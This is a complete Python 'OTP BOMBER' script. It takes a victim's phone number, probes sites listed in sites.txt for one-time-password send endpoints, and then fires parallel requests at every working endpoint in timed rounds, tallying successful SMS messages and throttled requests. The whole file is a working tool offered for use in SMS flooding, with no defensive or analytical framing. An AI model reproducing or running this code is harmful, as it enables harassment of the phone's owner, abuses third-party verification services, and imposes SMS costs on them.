#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OTP BOMBER
==========
Enter phone number -> enter rounds -> done.

Every round runs for a FULL 30 seconds and fires non-stop at every live
site in sites.txt, in parallel. More live sites = more SMS per round.

sites.txt line format:
    domain.com                                  <- tool hunts the endpoint
    domain.com|/api/auth/send-otp               <- exact endpoint
    domain.com|/api/auth/send-otp|phone|json    <- endpoint + field + style

The tool TESTS every line on startup and keeps only the live ones.
"""

import os
import re
import sys
import time
from concurrent.futures import (ThreadPoolExecutor, as_completed, wait,
                                FIRST_COMPLETED)

import requests

# ----------------- settings -----------------
WORKERS       = 100     # parallel requests in flight. 200 = faster
ROUND_SECONDS = 30      # every round runs EXACTLY this long
TIMEOUT       = 12      # per-request timeout
COUNTRY_CODE  = "972"   # country prefix, no plus
USE_PLUS      = False   # True -> send +972..., False -> send 972...
PROBE_LIMIT   = 12      # paths tried when the endpoint is unknown

UA = ("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36")


def app_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


HERE = app_dir()
SITES_FILE = os.path.join(HERE, "sites.txt")

PROBE_PATHS = [
    "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
    "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
    "/auth/send-otp", "/auth/otp", "/send-otp", "/otp/send", "/api/send-code",
]


# ----------------- helpers -----------------
def norm_phone(raw):
    p = re.sub(r"[^\d]", "", raw)
    if p.startswith(COUNTRY_CODE):
        intl = p
    elif p.startswith("0"):
        intl = COUNTRY_CODE + p[1:]
    else:
        intl = COUNTRY_CODE + p if len(p) <= 9 else p
    return ("+" + intl) if USE_PLUS else intl


def load_sites():
    sites = []
    with open(SITES_FILE, encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            parts = [x.strip() for x in line.split("|")]
            base = parts[0]
            if not base.startswith("http"):
                base = "https://" + base
            sites.append({
                "base":  base.rstrip("/"),
                "path":  parts[1] if len(parts) > 1 and parts[1] else None,
                "field": parts[2] if len(parts) > 2 and parts[2] else "phone",
                "style": parts[3] if len(parts) > 3 and parts[3] else "json",
            })
    return sites


def fire(base, path, field, phone, style="json"):
    """returns status code, or 0 on network error"""
    url = base + path
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*"}
    try:
        if style == "form":
            h["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.post(url, data={field: phone}, headers=h, timeout=TIMEOUT)
        elif style == "query":
            r = requests.get(url, params={field: phone}, headers=h, timeout=TIMEOUT)
        else:
            h["Content-Type"] = "application/json"
            r = requests.post(url, json={field: phone}, headers=h, timeout=TIMEOUT)
        return r.status_code
    except Exception:
        return 0


def alive_code(code):
    """for discovery: 2xx = works, 429 = works but throttled"""
    return (200 <= code < 300) or code == 429


# ----------------- discovery -----------------
def discover(sites, phone):
    alive, near = [], []
    print(f"\n[*] Testing {len(sites)} sites. This takes a moment...\n")
    start = time.time()

    def check(site):
        tried = []
        if site["path"]:
            tried.append((site["path"], site["field"], site["style"]))
        for p in PROBE_PATHS[:PROBE_LIMIT]:
            if not site["path"] or p != site["path"]:
                tried.append((p, "phone", "json"))
        for path, field, style in tried:
            code = fire(site["base"], path, field, phone, style)
            if alive_code(code):
                return (site["base"], path, field, style, code)
        if tried:
            code = fire(site["base"], tried[0][0], tried[0][1], phone, tried[0][2])
            if 400 <= code < 500 and code != 404:
                return ("NEAR", site["base"], tried[0][0], code)
        return None

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(check, s) for s in sites]
        for fut in as_completed(futs):
            res = fut.result()
            if not res:
                continue
            if res[0] == "NEAR":
                near.append(res)
                print(f"  ~ {res[1]}{res[2]}   ({res[3]})")
            else:
                base, path, field, style, code = res
                alive.append({"base": base, "path": path,
                              "field": field, "style": style})
                print(f"  + {base}{path}   [{code}]")

    print(f"\n[*] LIVE: {len(alive)} endpoints   |   "
          f"near-miss: {len(near)}   |   {time.time() - start:.0f}s\n")
    return alive


# ----------------- rounds -----------------
def run_round(endpoints, phone, budget):
    """fire NON-STOP at every live endpoint for `budget` seconds"""
    deadline = time.time() + budget
    stats = {"sent": 0, "ok": 0, "throttled": 0, "fail": 0}
    n = len(endpoints)
    idx = 0
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    pending = set()
    last = time.time()

    try:
        while True:
            now = time.time()
            while len(pending) < WORKERS and now < deadline:
                e = endpoints[idx % n]
                idx += 1
                pending.add(ex.submit(fire, e["base"], e["path"],
                                      e["field"], phone, e["style"]))
                now = time.time()

            if not pending:
                break

            done, pending = wait(pending, timeout=0.15,
                                 return_when=FIRST_COMPLETED)
            for f in done:
                stats["sent"] += 1
                code = f.result()
                if 200 <= code < 300:
                    stats["ok"] += 1
                elif code == 429:
                    stats["throttled"] += 1
                else:
                    stats["fail"] += 1

            if time.time() - last >= 1.0:
                last = time.time()
                left = max(0.0, deadline - time.time())
                print(f"\r      {left:4.1f}s left   sent {stats['sent']}   "
                      f"ok {stats['ok']}   throttled {stats['throttled']}",
                      end="", flush=True)

            if time.time() >= deadline and not pending:
                break
    finally:
        ex.shutdown(wait=False)
    print()
    return stats


def main():
    print("=" * 56)
    print("               O T P   B O M B E R")
    print("=" * 56)

    if not os.path.exists(SITES_FILE):
        print("\n[X] sites.txt not found next to this program.")
        input("\nPress Enter to exit...")
        return

    sites = load_sites()
    if not sites:
        print("\n[X] sites.txt is empty.")
        input("\nPress Enter to exit...")
        return

    phone_raw = input("\nEnter phone number: ").strip()
    if not phone_raw:
        return
    phone = norm_phone(phone_raw)
    print(f"    -> will send as: {phone}")

    try:
        rounds = int(input("How many rounds: ").strip() or "1")
    except ValueError:
        rounds = 1
    rounds = max(1, rounds)

    alive = discover(sites, phone)
    if not alive:
        print("[X] Nothing alive. Check your internet or the site list.")
        input("\nPress Enter to exit...")
        return

    print(f"[*] {rounds} rounds x {ROUND_SECONDS}s = "
          f"{rounds * ROUND_SECONDS}s of non-stop firing.")
    print("[*] Ctrl+C to stop early.\n")

    t0 = time.time()
    tot_ok = tot_sent = tot_thr = 0
    for r in range(1, rounds + 1):
        print(f"  Round {r}/{rounds}")
        st = run_round(alive, phone, ROUND_SECONDS)
        tot_ok += st["ok"]
        tot_sent += st["sent"]
        tot_thr += st["throttled"]
        print(f"    -> sent {st['sent']}   ok {st['ok']}   "
              f"throttled {st['throttled']}   fail {st['fail']}\n")

    el = time.time() - t0
    print("=" * 56)
    print(f"  rounds          : {rounds}")
    print(f"  requests sent   : {tot_sent}")
    print(f"  successful SMS  : {tot_ok}")
    print(f"  throttled (429) : {tot_thr}")
    print(f"  total time      : {el:.0f}s")
    if el > 0:
        print(f"  speed           : {tot_ok / el:.1f} sms/sec")
    print("=" * 56)
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nbye.")
